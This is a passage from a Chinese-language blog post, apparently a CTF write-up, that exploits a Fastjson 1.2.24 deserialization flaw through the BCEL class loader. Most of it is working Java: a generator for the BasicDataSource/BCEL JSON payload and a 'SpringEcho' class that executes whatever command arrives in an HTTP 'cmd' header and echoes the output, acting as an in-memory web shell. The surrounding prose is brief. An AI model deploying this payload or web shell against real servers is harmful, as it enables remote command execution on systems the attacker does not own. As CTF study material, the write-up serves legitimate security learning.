+<h2 id="FastjsonBcel"><a href="#FastjsonBcel" class="headerlink" title="FastjsonBcel"></a>FastjsonBcel</h2><p>一个fastjson解析，然后版本是1.2.24，并且有bcel</p>
+<p><img src="/image/image-20240603225811866.png" alt="image-20240603225811866"></p>
+<p>那么直接打就行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.polar.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(SpringEcho.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;y\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.polar.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringEcho</span> &#123;</span><br><span class="line">    <span class="comment">//静态代码块在类加载的时候就会去执行</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//首先获取当前的HttpServletRequest和HttpServletResponse对象。</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">            c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">            <span class="comment">//通过反射获取HttpServletRequest的&quot;getHeader&quot;方法，用于获取HTTP请求头&quot;cmd&quot;的值，通过变量&quot;cmd&quot;执行系统命令。</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">            getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">            <span class="comment">//这里对操作系统做了判断，windows和linux的采用cmd和/bin/bash来命令执行</span></span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            commands[<span class="number">2</span>] = cmd;</span><br><span class="line">            <span class="comment">//使用反射获取&quot;writer&quot;对象的方法，然后执行命令并输出结果</span></span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>json发包即可</p>
+<p><img src="/image/image-20240603225959580.png" alt="image-20240603225959580"></p>
+<p>用之前的内存马会出现找不到AbstractTranslet类的情况，不太清楚什么原因….</p>
+<p>后续在@nivia的帮助下，了解到BCEL在进行类加载时，只能加载以这几种包名开头的类，所以想要注入spring内存马，必须得使用全反射。</p>
+<p><img src="/image/image-20240604190850104.png" alt="image-20240604190850104"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/05/12/%E8%AE%B0%E4%B8%80%E6%AC%A1Thinkphp%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" rel="prev" title="记一次Thinkphp远程调试">
+      <i class="fa fa-chevron-left"></i> 记一次Thinkphp远程调试
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cc%E9%93%BE"><span class="nav-number">1.</span> <span class="nav-text">cc链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezjson"><span class="nav-number">2.</span> <span class="nav-text">ezjson</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FastjsonBcel"><span class="nav-number">3.</span> <span class="nav-text">FastjsonBcel</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ycxlo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ycxlo</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
